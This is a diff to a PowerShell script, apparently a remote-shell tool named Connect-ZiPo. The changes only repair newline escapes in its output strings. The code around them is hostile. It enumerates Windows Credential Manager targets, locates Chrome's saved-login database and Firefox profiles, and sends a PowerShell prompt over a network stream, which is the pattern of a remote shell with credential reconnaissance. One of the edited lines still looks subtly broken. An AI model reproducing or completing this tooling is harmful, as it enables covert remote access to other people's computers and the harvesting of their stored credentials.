@@ -163,19 +163,19 @@ function Connect-ZiPo {
         # 1. Windows Credential Manager (generic credentials)
         $creds = cmdkey /list | Select-String "Target:" | ForEach-Object {
             $target = $_.ToString().Split(":")[1].Trim()
-            $output += "n[TARGET] $target"
+            $output += "`n[TARGET] $target"
         }
 
         # 2. Chrome saved logins (мета-данные — без дешифровки)
         $chromeLoginPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
         if (Test-Path $chromeLoginPath) {
-            $output += "n[+] Chrome login database found: $chromeLoginPath"
+            $output += "`n[+] Chrome login database found: $chromeLoginPath"
         }
 
         # 3. Firefox профили (только список профилей)
         $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -ErrorAction SilentlyContinue
         foreach ($profile in $firefoxProfiles) {
-            $output += "n[+] Firefox profile: $($profile.FullName)"
+            $output += "`n[+] Firefox profile: $($profile.FullName)"
         }
 
         if ([string]::IsNullOrWhiteSpace($output)) {
@@ -312,7 +312,7 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
 ------------------------------------------------------------
 "@
 
-            $intro = $clear + $banner + "nPS $currentDir> "
+            $intro = $clear + $banner + "`nPS $currentDir> "
             $bbytes = [Text.Encoding]::UTF8.GetBytes($intro)
             $stream.Write($bbytes, 0, $bbytes.Length)
             $stream.Flush()
@@ -411,7 +411,7 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                 }
 
                 # Обновлённое добавление приглашения:
-                $response = ($response.TrimEnd() + "nnPS $((Get-Location).Path)> ")
+                $response = ($response.TrimEnd() + "`nnPS $((Get-Location).Path)> ")
 
 
 
